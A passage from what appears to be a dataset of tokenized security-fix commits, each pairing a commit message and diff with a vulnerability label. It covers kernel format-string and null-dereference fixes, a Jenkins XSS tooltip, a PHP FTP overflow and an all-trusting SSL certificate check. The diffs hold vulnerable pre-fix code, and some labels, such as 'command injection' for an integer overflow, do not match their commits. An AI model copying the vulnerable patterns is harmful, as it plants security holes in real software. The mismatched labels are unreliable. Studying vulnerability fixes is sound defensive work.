"assertThat", "(", "ConstraintViolations", ".", "format", "(", "validator", ".", "validate", "(", "new", "CorrectExample", "(", "))", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "assertThat", "(", "TestLoggerFactory", ".", "getAllLoggingEvents", "(", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "}", "@", "Test", "public", "void", "testDirectContextUsage", "(", ")", "throws", "Exception", "{", "public", "void", "testDirectContextUsage", "(", ")", "{", "assertThat", "(", "ConstraintViolations", ".", "format", "(", "validator", ".", "validate", "(", "new", "DirectContextExample", "(", "))", "))", ".", "containsExactlyInAnyOrder", "(", "FAILED_RESULT", ")", ";", ".", "containsExactlyInAnyOrder", "(", "FAILED_RESULT", ")", ";", "assertThat", "(", "TestLoggerFactory", ".", "getAllLoggingEvents", "(", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "}", "@", "Test", "public", "void", "complexExample", "(", ")", "throws", "Exception", "{", "public", "void", "complexExample", "(", ")", "{", "assertThat", "(", "ConstraintViolations", ".", "format", "(", "validator", ".", "validate", "(", "new", "ComplexExample", "(", "))", "))", ".", "containsExactlyInAnyOrder", "(", "FAILED_RESULT", "+", "\"", "1", "\"", ",", "FAILED_RESULT", "+", "\"", "2", "\"", ",", "FAILED_RESULT", "+", "\"", "3", "\"", ")", ";", ".", "containsExactly", "(", "\"", "failed1", "\"", ",", "\"", "p2", "failed", "\"", ",", "\"", "p", "[", "3", "]", "failed", "\"", ",", "\"", "p", "[", "four", "]", "failed", "\"", ");", "assertThat", "(", "TestLoggerFactory", ".", "getAllLoggingEvents", "(", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "}", "@", "Test", "public", "void", "invalidExample", "(", ")", "throws", "Exception", "{", "assertThat", "(", "ConstraintViolations", ".", "format", "(", "validator", ".", "validate", "(", "new", "InvalidExample", "(", "))", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "assertThat", "(", "TestLoggerFactory", ".", "getAllLoggingEvents", "(", "))", ".", "containsExactlyInAnyOrder", "(", "new", "LoggingEvent", "(", "Level", ".", "ERROR", ",", "\"", "The", "method", "{", "}", "is", "annotated", "with", "@", "SelfValidation", "but", "does", "not", "have", "a", "single", "parameter", "of", "type", "{", "}\"", ",", "InvalidExample", ".", "class", ".", "getMethod", "(", "\"", "validateFailAdditionalParameters", "\"", ",", "ViolationCollector", ".", "class", ",", "int", ".", "class", ")", ",", "ViolationCollector", ".", "class", ")", ",", "new", "LoggingEvent", "(", "Level", ".", "ERROR", ",", "\"", "The", "method", "{", "}", "is", "annotated", "with", "@", "SelfValidation", "but", "does", "not", "return", "void", ".", "It", "is", "ignored", "\"", ",", "InvalidExample", ".", "class", ".", "getMethod", "(", "\"", "validateFailReturn", "\"", ",", "ViolationCollector", ".", "class", ")", ")", ",", "new", "LoggingEvent", "(", "Level", ".", "ERROR", ",", "\"", "The", "method", "{", "}", "is", "annotated", "with", "@", "SelfValidation", "but", "is", "not", "public", "\"", ",", "InvalidExample", ".", "class", ".", "getDeclaredMethod", "(", "\"", "validateFailPrivate", "\"", ",", "ViolationCollector", ".", "class", ")", ")", ")", ";", ".", "containsExactlyInAnyOrder", "(", "new", "LoggingEvent", "(", "Level", ".", "ERROR", ",", "\"", "The", "method", "{", "}", "is", "annotated", "with", "@", "SelfValidation", "but", "does", "not", "have", "a", "single", "parameter", "of", "type", "{", "}\"", ",", "InvalidExample", ".", "class", ".", "getMethod", "(", "\"", "validateFailAdditionalParameters", "\"", ",", "ViolationCollector", ".", "class", ",", "int", ".", "class", ")", ",", "ViolationCollector", ".", "class", ")", ",", "new", "LoggingEvent", "(", "Level", ".", "ERROR", ",", "\"", "The", "method", "{", "}", "is", "annotated", "with", "@", "SelfValidation", "but", "does", "not", "return", "void", ".", "It", "is", "ignored", "\"", ",", "InvalidExample", ".", "class", ".", "getMethod", "(", "\"", "validateFailReturn", "\"", ",", "ViolationCollector", ".", "class", ")", ")", ",", "new", "LoggingEvent", "(", "Level", ".", "ERROR", ",", "\"", "The", "method", "{", "}", "is", "annotated", "with", "@", "SelfValidation", "but", "is", "not", "public", "\"", ",", "InvalidExample", ".", "class", ".", "getDeclaredMethod", "(", "\"", "validateFailPrivate", "\"", ",", "ViolationCollector", ".", "class", ")", ")", ")", ";", "}", "@", "Test", "public", "void", "giveWarningIfNoValidationMethods", "(", ")", "throws", "Exception", "{", "public", "void", "giveWarningIfNoValidationMethods", "(", ")", "{", "assertThat", "(", "ConstraintViolations", ".", "format", "(", "validator", ".", "validate", "(", "new", "NoValidations", "(", "))", "))", ".", "isEmpty", "(", ");", ".", "isEmpty", "(", ");", "assertThat", "(", "TestLoggerFactory", ".", "getAllLoggingEvents", "(", "))", ".", "containsExactlyInAnyOrder", "(", "new", "LoggingEvent", "(", "Level", ".", "WARN", ",", "\"", "The", "class", "{", "}", "is", "annotated", "with", "@", "SelfValidating", "but", "contains", "no", "valid", "methods", "that", "are", "annotated", "with", "@", "SelfValidation", "\"", ",", "NoValidations", ".", "class", ")", ".", "containsExactlyInAnyOrder", "(", "new", "LoggingEvent", "(", "Level", ".", "WARN", ",", "\"", "The", "class", "{", "}", "is", "annotated", "with", "@", "SelfValidating", "but", "contains", "no", "valid", "methods", "that", "are", "annotated", "with", "@", "SelfValidation", "\"", ",", "NoValidations", ".", "class", ")", ")", ";", "}", "@", "Test", "public", "void", "violationMessagesAreEscaped", "(", ")", "{", "assertThat", "(", "ConstraintViolations", ".", "format", "(", "validator", ".", "validate", "(", "new", "InjectionExample", "(", "))", "))", ".", "containsExactly", "(", "\"", "$", "{'", "value", "'", "}\"", ",", "\"", "${", "'", "property", "'", "}", "$", "{'", "value", "'", "}\"", ",", "\"", "${", "'", "property", "'", "}[", "${", "'", "key", "'", "}]", "$", "{'", "value", "'", "}\"", ",", "\"", "${", "'", "property", "'", "}[", "1", "]", "$", "{'", "value", "'", "}\"", ")", ";", "assertThat", "(", "TestLoggerFactory", ".", "getAllLoggingEvents", "(", "))", ".", "isEmpty", "(", ");", "}", "}"], "docstring_tokens": ["arbitrary", "code", "execution"]}
{"contents": ["sg_write()/bsg_write()", "is", "not", "fit", "to", "be", "called", "under", "KERNEL_DS", "Both", "damn", "things", "interpret", "userland", "pointers", "embedded", "into", "the", "payload;", "worse,", "they", "are", "actually", "traversing", "those.", "Leaving", "aside", "the", "bad", "API", "design,", "this", "is", "very", "much", "_not_", "safe", "to", "call", "with", "KERNEL_DS.", "Bail", "out", "early", "if", "that", "happens.", "Cc:", "stable@vger.kernel.org", "Signed-off-by:", "Al", "Viro", "<viro@zeniv.linux.org.uk>"], "code_tokens": ["@", "@", "-", "655", ",", "6", "+", "655", ",", "9", "@", "@", "bsg_write", "(", "struct", "file", "*", "file", ",", "const", "char", "__user", "*", "buf", ",", "size_t", "count", ",", "loff_t", "*", "ppos", ")", "dprintk", "(", "\"%", "s", ":", "write", "%", "Zd", "bytes", "\\", "n", "\"", ",", "bd", "-", ">", "name", ",", "count", ")", ";", "if", "(", "unlikely", "(", "segment_eq", "(", "get_fs", "(", "),", "KERNEL_DS", ")", "))", "return", "-", "EINVAL", ";", "bsg_set_block", "(", "bd", ",", "file", ")", ";", "bytes_written", "=", "0", ";", "@", "@", "-", "581", ",", "6", "+", "581", ",", "9", "@", "@", "sg_write", "(", "struct", "file", "*", "filp", ",", "const", "char", "__user", "*", "buf", ",", "size_t", "count", ",", "loff_t", "*", "ppos", ")", "sg_io_hdr_t", "*", "hp", ";", "unsigned", "char", "cmnd", "[", "SG_MAX_CDB_SIZE", "]", ";", "if", "(", "unlikely", "(", "segment_eq", "(", "get_fs", "(", "),", "KERNEL_DS", ")", "))", "return", "-", "EINVAL", ";", "if", "(", "(!", "(", "sfp", "=", "(", "Sg_fd", "*", ")", "filp", "-", ">", "private_data", ")", ")", "|", "|", "(", "!(", "sdp", "=", "sfp", "-", ">", "parentdp", ")", "))", "return", "-", "ENXIO", ";", "SCSI_LOG_TIMEOUT", "(", "3", ",", "sg_printk", "(", "KERN_INFO", ",", "sdp", ","], "docstring_tokens": ["use-after-free", "error"]}
{"contents": ["IB/core:", "Don't", "resolve", "passive", "side", "RoCE", "L2", "address", "in", "CMA", "REQ", "handler", "The", "code", "that", "resolves", "the", "passive", "side", "source", "MAC", "within", "the", "rdma_cm", "connection", "request", "handler", "was", "both", "redundant", "and", "buggy,", "so", "remove", "it.", "It", "was", "redundant", "since", "later,", "when", "an", "RC", "QP", "is", "modified", "to", "RTR", "state,", "the", "resolution", "will", "take", "place", "in", "the", "ib_core", "module.", "It", "was", "buggy", "because", "this", "callback", "also", "deals", "with", "UD", "SIDR", "exchange,", "for", "which", "we", "incorrectly", "looked", "at", "the", "REQ", "member", "of", "the", "CM", "event", "and", "dereferenced", "a", "random", "value.", "Fixes:", "dd5f03beb4f7", "(\"IB/core:", "Ethernet", "L2", "attributes", "in", "verbs/cm", "structures\")", "Signed-off-by:", "Moni", "Shoua", "<monis@mellanox.com>", "Signed-off-by:", "Or", "Gerlitz", "<ogerlitz@mellanox.com>", "Signed-off-by:", "Roland", "Dreier", "<roland@purestorage.com>"], "code_tokens": ["@", "@", "-", "349", ",", "23", "+", "349", ",", "6", "@", "@", "static", "void", "cm_init_av_for_response", "(", "struct", "cm_port", "*", "port", ",", "struct", "ib_wc", "*", "wc", ",", "grh", ",", "&", "av", "-", ">", "ah_attr", ")", ";", "}", "int", "ib_update_cm_av", "(", "struct", "ib_cm_id", "*", "id", ",", "const", "u8", "*", "smac", ",", "const", "u8", "*", "alt_smac", ")", "{", "struct", "cm_id_private", "*", "cm_id_priv", ";", "cm_id_priv", "=", "container_of", "(", "id", ",", "struct", "cm_id_private", ",", "id", ")", ";", "if", "(", "smac", "!", "=", "NULL", ")", "memcpy", "(", "cm_id_priv", "-", ">", "av", ".", "smac", ",", "smac", ",", "sizeof", "(", "cm_id_priv", "-", ">", "av", ".", "smac", ")", ");", "if", "(", "alt_smac", "!", "=", "NULL", ")", "memcpy", "(", "cm_id_priv", "-", ">", "alt_av", ".", "smac", ",", "alt_smac", ",", "sizeof", "(", "cm_id_priv", "-", ">", "alt_av", ".", "smac", ")", ");", "return", "0", ";", "}", "EXPORT_SYMBOL", "(", "ib_update_cm_av", ")", ";", "static", "int", "cm_init_av_by_path", "(", "struct", "ib_sa_path_rec", "*", "path", ",", "struct", "cm_av", "*", "av", ")", "{", "struct", "cm_device", "*", "cm_dev", ";", "@", "@", "-", "1284", ",", "15", "+", "1284", ",", "6", "@", "@", "static", "int", "cma_req_handler", "(", "struct", "ib_cm_id", "*", "cm_id", ",", "struct", "ib_cm_event", "*", "ib_event", ")", "struct", "rdma_id_private", "*", "listen_id", ",", "*", "conn_id", ";", "struct", "rdma_cm_event", "event", ";", "int", "offset", ",", "ret", ";", "u8", "smac", "[", "ETH_ALEN", "]", ";", "u8", "alt_smac", "[", "ETH_ALEN", "]", ";", "u8", "*", "psmac", "=", "smac", ";", "u8", "*", "palt_smac", "=", "alt_smac", ";", "int", "is_iboe", "=", "(", "(", "rdma_node_get_transport", "(", "cm_id", "-", ">", "device", "-", ">", "node_type", ")", "=", "=", "RDMA_TRANSPORT_IB", ")", "&", "&", "(", "rdma_port_get_link_layer", "(", "cm_id", "-", ">", "device", ",", "ib_event", "-", ">", "param", ".", "req_rcvd", ".", "port", ")", "=", "=", "IB_LINK_LAYER_ETHERNET", ")", ");", "listen_id", "=", "cm_id", "-", ">", "context", ";", "if", "(", "!", "cma_check_req_qp_type", "(", "&", "listen_id", "-", ">", "id", ",", "ib_event", ")", ")", "@", "@", "-", "1336", ",", "28", "+", "1327", ",", "11", "@", "@", "static", "int", "cma_req_handler", "(", "struct", "ib_cm_id", "*", "cm_id", ",", "struct", "ib_cm_event", "*", "ib_event", ")", "ret", "=", "conn_id", "-", ">", "id", ".", "event_handler", "(", "&", "conn_id", "-", ">", "id", ",", "&", "event", ")", ";", "if", "(", "ret", ")", "goto", "err3", ";", "if", "(", "is_iboe", ")", "{", "if", "(", "ib_event", "-", ">", "param", ".", "req_rcvd", ".", "primary_path", "!", "=", "NULL", ")", "rdma_addr_find_smac_by_sgid", "(", "&", "ib_event", "-", ">", "param", ".", "req_rcvd", ".", "primary_path", "-", ">", "sgid", ",", "psmac", ",", "NULL", ")", ";", "else", "psmac", "=", "NULL", ";", "if", "(", "ib_event", "-", ">", "param", ".", "req_rcvd", ".", "alternate_path", "!", "=", "NULL", ")", "rdma_addr_find_smac_by_sgid", "(", "&", "ib_event", "-", ">", "param", ".", "req_rcvd", ".", "alternate_path", "-", ">", "sgid", ",", "palt_smac", ",", "NULL", ")", ";", "else", "palt_smac", "=", "NULL", ";", "}", "/", "*", "*", "Acquire", "mutex", "to", "prevent", "user", "executing", "rdma_destroy_id", "(", ")", "*", "while", "we", "'", "re", "accessing", "the", "cm_id", ".", "*", "/", "mutex_lock", "(", "&", "lock", ")", ";", "if", "(", "is_iboe", ")", "ib_update_cm_av", "(", "cm_id", ",", "psmac", ",", "palt_smac", ")", ";", "if", "(", "cma_comp", "(", "conn_id", ",", "RDMA_CM_CONNECT", ")", "&", "&", "(", "conn_id", "-", ">", "id", ".", "qp_type", "!", "=", "IB_QPT_UD", ")", ")", "ib_send_cm_mra", "(", "cm_id", ",", "CMA_CM_MRA_SETTING", ",", "NULL", ",", "0", ")", ";", "@", "@", "-", "601", ",", "5", "+", "601", ",", "4", "@", "@", "struct", "ib_cm_sidr_rep_param", "{", "int", "ib_send_cm_sidr_rep", "(", "struct", "ib_cm_id", "*", "cm_id", ",", "struct", "ib_cm_sidr_rep_param", "*", "param", ")", ";", "int", "ib_update_cm_av", "(", "struct", "ib_cm_id", "*", "id", ",", "const", "u8", "*", "smac", ",", "const", "u8", "*", "alt_smac", ")", ";", "#", "endif", "/", "*", "IB_CM_H", "*", "/"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["[FIXED", "SECURITY-136]", "[extra-columns]", "Project", "Description", "column", "tooltip", "shows", "unsafe", "HTML"], "code_tokens": ["@", "@", "-", "32", ",", "7", "+", "32", ",", "7", "@", "@", "<", "j", ":", "if", "test", "=", "\"$", "{", "it", ".", "isDisplayName", "(", ")}", "\">", "<", "a", "href", "=", "\"$", "{", "jobBaseUrl", "}", "${", "job", ".", "shortUrl", "}", "\"", "class", "=", "'", "model", "-", "link", "inside", "'", ">$", "{", "relativeDisplayName", "!", "=", "null", "?", "relativeDisplayName", ":", "job", ".", "displayName", "}", "</", "a", ">", "<", "br", "/", ">", "<", "/", "j", ":", "if", ">", "<", "div", "tooltip", "=", "\"$", "{", "tooltipdesc", "}", "\"", "style", "=", "\"$", "{", "it", ".", "isForceWidth", "(", ")", "?", "widthAttribute", ":", "null", "}", "\">", "<", "div", "tooltip", "=", "\"$", "{", "app", ".", "markupFormatter", ".", "translate", "(", "tooltipdesc", ")", "}\"", "style", "=", "\"$", "{", "it", ".", "isForceWidth", "(", ")", "?", "widthAttribute", ":", "null", "}", "\">", "<", "j", ":", "out", "value", "=", "\"$", "{", "app", ".", "markupFormatter", ".", "translate", "(", "desc", ")", "}\"", "/>", "<", "/", "div", ">", "<", "/", "td", ">"], "docstring_tokens": ["cross-site", "scripting", "(xss", ")"]}
{"contents": ["[security]", "Added", "missing", "SECURITY.md"], "code_tokens": ["@", "@", "-", "0", ",", "0", "+", "1", ",", "47", "@", "@", "#", "Security", "Guidelines", "Please", "contact", "us", "directly", "at", "*", "*", "security", "@", "3rd", "-", "Eden", ".", "com", "*", "*", "for", "any", "bug", "that", "might", "impact", "the", "security", "of", "this", "project", ".", "Please", "prefix", "the", "subject", "of", "your", "email", "with", "`", "[", "security", "]", "`", "in", "lowercase", "and", "square", "brackets", ".", "Our", "email", "filters", "will", "automatically", "prevent", "these", "messages", "from", "being", "moved", "to", "our", "spam", "box", ".", "All", "emails", "that", "do", "not", "include", "security", "vulnerabilities", "will", "be", "removed", "and", "blocked", "instantly", ".", "In", "addition", "to", "a", "dedicated", "email", "address", "to", "receive", "security", "related", "reports", ",", "we", "also", "have", "a", "[", "Hacker1", "account", "]", "[", "hacker1", "]", "that", "can", "be", "used", "be", "used", "for", "communicating", "security", "related", "issues", ".", "You", "will", "receive", "an", "acknowledgement", "of", "your", "report", "within", "*", "*", "24", "hours", "*", "*", "of", "notification", ".", "#", "#", "Exceptions", "If", "you", "do", "not", "receive", "an", "acknowledgement", "within", "the", "said", "time", "frame", "please", "give", "us", "the", "benefit", "of", "the", "doubt", "as", "it", "'", "s", "possible", "that", "we", "haven", "'", "t", "seen", "it", "yet", ".", "In", "this", "case", "please", "send", "us", "a", "message", "*", "*", "without", "details", "*", "*", "using", "one", "of", "the", "following", "methods", ":", "-", "Give", "a", "poke", "on", "Twitter", "[", "@", "3rdEden", "]", "(", "https", ":", "//", "twitter", ".", "com", "/", "3rdEden", ")", "-", "Contact", "the", "lead", "developers", "of", "this", "project", "on", "their", "personal", "e", "-", "mails", ".", "You", "can", "find", "the", "e", "-", "mails", "in", "the", "git", "logs", ",", "for", "example", "using", "the", "following", "command", ":", "`", "git", "-", "-", "no", "-", "pager", "show", "-", "s", "-", "-", "format", "=", "'%", "an", "<", "%", "ae", ">", "'", "<", "gitsha", ">", "`", "where", "`", "<", "gitsha", ">", "`", "is", "the", "SHA1", "of", "their", "latest", "commit", "in", "the", "project", ".", "Once", "we", "have", "acknowledged", "receipt", "of", "your", "report", "and", "confirmed", "the", "bug", "ourselves", "we", "will", "work", "with", "you", "to", "fix", "the", "vulnerability", "and", "publicly", "acknowledge", "your", "responsible", "disclosure", ",", "if", "you", "wish", ".", "#", "#", "History", ">", "url", "-", "parse", "returns", "wrong", "hostname", "which", "leads", "to", "multiple", "vulnerabilities", "such", ">", "as", "SSRF", ",", "Open", "Redirect", ",", "Bypass", "Authentication", "Protocol", ".", "-", "Hacker1", "report", ":", "https", ":", "//", "hackerone", ".", "com", "/", "reports", "/", "384029", "-", "Reported", "by", "[", "lolwaleet", "]", "(", "https", ":", "//", "hackerone", ".", "com", "/", "lolwalee", ")", "-", "Triaged", "by", "[", "Liran", "Tal", "]", "(", "https", ":", "//", "hackerone", ".", "com", "/", "lirantal", ")", "-", "Fixed", "in", ":", "1", ".", "4", ".", "3", "-", "--", "[", "twitter", "]", ":", "https", ":", "//", "twitter", ".", "com", "/", "3rdEden", "[", "hacker1", "]", ":", "https", ":", "//", "hackerone", ".", "com", "/", "3rdeden"], "docstring_tokens": ["open", "redirect"]}
{"contents": ["improve", "fix", "for", "Bug", "#69545"], "code_tokens": ["@", "@", "-", "2", ",", "6", "+", "2", ",", "10", "@", "@", "PHP", "NEWS", "|", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "||", "?", "?", "?", "??", "2015", "PHP", "5", ".", "4", ".", "42", "-", "Core", ":", ".", "Imroved", "fix", "for", "bug", "#", "69545", "(", "Integer", "overflow", "in", "ftp_genlist", "(", ")", "resulting", "in", "heap", "overflow", ")", ".", "(", "Max", "Spelsberg", ")", "-", "Postgres", ":", ".", "Fixed", "bug", "#", "69667", "(", "segfault", "in", "php_pgsql_meta_data", ")", ".", "(", "Remi", ")", "@", "@", "-", "1668", ",", "8", "+", "1668", ",", "6", "@", "@", "ftp_genlist", "(", "ftpbuf_t", "*", "ftp", ",", "const", "char", "*", "cmd", ",", "const", "char", "*", "path", "TSRMLS_DC", ")", "for", "(", "ptr", "=", "data", "-", ">", "buf", ";", "rcvd", ";", "rcvd", "-", "-,", "ptr", "+", "+)", "{", "if", "(", "*", "ptr", "=", "=", "'", "\\", "n", "'", "&", "&", "lastch", "=", "=", "'", "\\", "r", "'", ")", "{", "lines", "+", "+;", "}", "else", "{", "size", "+", "+;", "}", "lastch", "=", "*", "ptr", ";", "}"], "docstring_tokens": ["command", "injection"]}
{"contents": ["block:", "do", "not", "pass", "disk", "names", "as", "format", "strings", "Disk", "names", "may", "contain", "arbitrary", "strings,", "so", "they", "must", "not", "be", "interpreted", "as", "format", "strings.", "It", "seems", "that", "only", "md", "allows", "arbitrary", "strings", "to", "be", "used", "for", "disk", "names,", "but", "this", "could", "allow", "for", "a", "local", "memory", "corruption", "from", "uid", "0", "into", "ring", "0.", "Signed-off-by:", "Kees", "Cook", "<keescook@chromium.org>", "Cc:", "Jens", "Axboe", "<axboe@kernel.dk>", "Cc:", "<stable@vger.kernel.org>", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["@", "@", "-", "512", ",", "7", "+", "512", ",", "7", "@", "@", "static", "void", "register_disk", "(", "struct", "gendisk", "*", "disk", ")", "ddev", "-", ">", "parent", "=", "disk", "-", ">", "driverfs_dev", ";", "dev_set_name", "(", "ddev", ",", "disk", "-", ">", "disk_name", ")", ";", "dev_set_name", "(", "ddev", ",", "\"", "%", "s", "\"", ",", "disk", "-", ">", "disk_name", ")", ";", "/", "*", "delay", "uevents", ",", "until", "we", "scanned", "partition", "table", "*", "/", "dev_set_uevent_suppress", "(", "ddev", ",", "1", ")", ";", "@", "@", "-", "714", ",", "7", "+", "714", ",", "8", "@", "@", "static", "int", "__nbd_ioctl", "(", "struct", "block_device", "*", "bdev", ",", "struct", "nbd_device", "*", "nbd", ",", "else", "blk_queue_flush", "(", "nbd", "-", ">", "disk", "-", ">", "queue", ",", "0", ")", ";", "thread", "=", "kthread_create", "(", "nbd_thread", ",", "nbd", ",", "nbd", "-", ">", "disk", "-", ">", "disk_name", ")", ";", "thread", "=", "kthread_create", "(", "nbd_thread", ",", "nbd", ",", "\"", "%", "s", "\"", ",", "nbd", "-", ">", "disk", "-", ">", "disk_name", ")", ";", "if", "(", "IS_ERR", "(", "thread", ")", ")", "{", "mutex_lock", "(", "&", "nbd", "-", ">", "tx_lock", ")", ";", "return", "PTR_ERR", "(", "thread", ")", ";", "@", "@", "-", "485", ",", "7", "+", "485", ",", "7", "@", "@", "static", "int", "osd_probe", "(", "struct", "device", "*", "dev", ")", "oud", "-", ">", "class_dev", ".", "class", "=", "&", "osd_uld_class", ";", "oud", "-", ">", "class_dev", ".", "parent", "=", "dev", ";", "oud", "-", ">", "class_dev", ".", "release", "=", "__remove", ";", "error", "=", "dev_set_name", "(", "&", "oud", "-", ">", "class_dev", ",", "disk", "-", ">", "disk_name", ")", ";", "error", "=", "dev_set_name", "(", "&", "oud", "-", ">", "class_dev", ",", "\"", "%", "s", "\"", ",", "disk", "-", ">", "disk_name", ")", ";", "if", "(", "error", ")", "{", "OSD_ERR", "(", "\"", "dev_set_name", "failed", "=", ">", "%", "d", "\\", "n", "\"", ",", "error", ")", ";", "goto", "err_put_cdev", ";"], "docstring_tokens": ["format", "string"]}
{"contents": ["USB:", "cdc-acm:", "more", "sanity", "checking", "An", "attack", "has", "become", "available", "which", "pretends", "to", "be", "a", "quirky", "device", "circumventing", "normal", "sanity", "checks", "and", "crashes", "the", "kernel", "by", "an", "insufficient", "number", "of", "interfaces.", "This", "patch", "adds", "a", "check", "to", "the", "code", "path", "for", "quirky", "devices.", "Signed-off-by:", "Oliver", "Neukum", "<ONeukum@suse.com>", "CC:", "stable@vger.kernel.org", "Signed-off-by:", "Greg", "Kroah-Hartman", "<gregkh@linuxfoundation.org>"], "code_tokens": ["@", "@", "-", "1179", ",", "6", "+", "1179", ",", "9", "@", "@", "static", "int", "acm_probe", "(", "struct", "usb_interface", "*", "intf", ",", "if", "(", "quirks", "=", "=", "NO_UNION_NORMAL", ")", "{", "data_interface", "=", "usb_ifnum_to_if", "(", "usb_dev", ",", "1", ")", ";", "control_interface", "=", "usb_ifnum_to_if", "(", "usb_dev", ",", "0", ")", ";", "/", "*", "we", "would", "crash", "*", "/", "if", "(", "!", "data_interface", "|", "|", "!", "control_interface", ")", "return", "-", "ENODEV", ";", "goto", "skip_normal_probe", ";", "}"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["[SECURITY-1411]"], "code_tokens": ["@", "@", "-", "389", ",", "7", "+", "389", ",", "7", "@", "@", "public", "String", "uploadArtifact", "(", "+", "\"", "/", "commander", "/", "cgi", "-", "bin", "/", "publishArtifactAPI", ".", "cgi", "\"", ";", "/", "/", "return", "sessionId", ";", "MultipartUtility", "multipart", "=", "new", "MultipartUtility", "(", "requestURL", ",", "CHARSET", ")", ";", "MultipartUtility", "multipart", "=", "new", "MultipartUtility", "(", "requestURL", ",", "CHARSET", ",", "this", ".", "getIgnoreSslConnectionErrors", "(", "))", ";", "multipart", ".", "addFormField", "(", "\"", "artifactName", "\"", ",", "name", ")", ";", "multipart", ".", "addFormField", "(", "\"", "artifactVersionVersion", "\"", ",", "version", ")", ";", "@", "@", "-", "9", ",", "6", "+", "9", ",", "9", "@", "@", "package", "org", ".", "jenkinsci", ".", "plugins", ".", "electricflow", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "import", "java", ".", "io", ".", "BufferedReader", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "FileInputStream", ";", "@", "@", "-", "37", ",", "6", "+", "40", ",", "7", "@", "@", "/", "/~", "Static", "fields", "/", "initializers", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "private", "static", "final", "String", "LINE_FEED", "=", "\"", "\\", "r", "\\", "n", "\"", ";", "private", "static", "final", "Log", "log", "=", "LogFactory", ".", "getLog", "(", "MultipartUtility", ".", "class", ")", ";", "/", "/~", "Instance", "fields", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "@", "@", "-", "54", ",", "47", "+", "58", ",", "18", "@", "@", "*", "*", "@", "param", "requestURL", "URL", "for", "request", "*", "@", "param", "charset", "name", "of", "encodings", "*", "@", "param", "ignoreSslConnectionErrors", "Override", "Electric", "Flow", "SSL", "Validation", "Check", "*", "*", "@", "throws", "NoSuchAlgorithmException", "Exception", "*", "@", "throws", "KeyManagementException", "Exception", "*", "@", "throws", "IOException", "Exception", "*", "/", "public", "MultipartUtility", "(", "String", "requestURL", ",", "String", "charset", ")", "throws", "NoSuchAlgorithmException", ",", "KeyManagementException", ",", "IOException", "String", "charset", ",", "boolean", "ignoreSslConnectionErrors", ")", "throws", "IOException", "{", "this", ".", "charset", "=", "charset", ";", "TrustManager", "[", "]", "trustAllCerts", "=", "new", "TrustManager", "[", "]", "{", "new", "X509TrustManager", "(", ")", "{", "@", "Override", "public", "java", ".", "security", ".", "cert", ".", "X509Certificate", "[", "]", "getAcceptedIssuers", "(", ")", "{", "return", "null", ";", "}", "@", "Override", "public", "void", "checkClientTrusted", "(", "X509Certificate", "[", "]", "certs", ",", "String", "authType", ")", "{", "}", "@", "Override", "public", "void", "checkServerTrusted", "(", "X509Certificate", "[", "]", "certs", ",", "String", "authType", ")", "{", "}", "}", "}", ";", "/", "/", "Install", "the", "all", "-", "trusting", "trust", "manager", "SSLContext", "sc", "=", "SSLContext", ".", "getInstance", "(", "\"", "SSL", "\"", ");", "sc", ".", "init", "(", "null", ",", "trustAllCerts", ",", "new", "java", ".", "security", ".", "SecureRandom", "(", "))", ";", "HttpsURLConnection", ".", "setDefaultSSLSocketFactory", "(", "sc", ".", "getSocketFactory", "(", "))", ";", "/", "/", "Create", "all", "-", "trusting", "host", "name", "verifier", "HostnameVerifier", "allHostsValid", "=", "(", "hostname", ",", "session", ")", "-", ">", "true", ";", "/", "/", "Install", "the", "all", "-", "trusting", "host", "verifier", "HttpsURLConnection", ".", "setDefaultHostnameVerifier", "(", "allHostsValid", ")", ";", "/", "/", "creates", "a", "unique", "boundary", "based", "on", "time", "stamp", "boundary", "=", "\"", "==", "=\"", "+", "System", ".", "currentTimeMillis", "(", ")", "+", "\"", "==", "=\"", ";", "@", "@", "-", "107", ",", "10", "+", "82", ",", "21", "@", "@", "public", "MultipartUtility", "(", "httpConn", ".", "setDoInput", "(", "true", ")", ";", "httpConn", ".", "setRequestProperty", "(", "\"", "Content", "-", "Type", "\"", ",", "\"", "multipart", "/", "form", "-", "data", ";", "boundary", "=", "\"", "+", "boundary", ")", ";", "if", "(", "ignoreSslConnectionErrors", ")", "{", "try", "{", "httpConn", ".", "setSSLSocketFactory", "(", "RelaxedSSLContext", ".", "getInstance", "(", ").", "getSocketFactory", "(", "))", ";", "}", "catch", "(", "KeyManagementException", "|", "NoSuchAlgorithmException", "e", ")", "{", "if", "(", "log", ".", "isDebugEnabled", "(", "))", "{", "log", ".", "debug", "(", "e", ".", "getMessage", "(", "),", "e", ")", ";", "}", "}", "httpConn", ".", "setHostnameVerifier", "(", "RelaxedSSLContext", ".", "allHostsValid", ")", ";", "}", "outputStream", "=", "httpConn", ".", "getOutputStream", "(", ");", "writer", "=", "new", "PrintWriter", "(", "new", "OutputStreamWriter", "(", "outputStream", ",", "charset", ")", ",", "true", ")", ";", "/", "/", "Create", "a", "trust", "manager", "that", "does", "not", "validate", "certificate", "chains", "}", "/", "/~", "Methods", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-"], "docstring_tokens": ["cross-site", "request", "forgery"]}
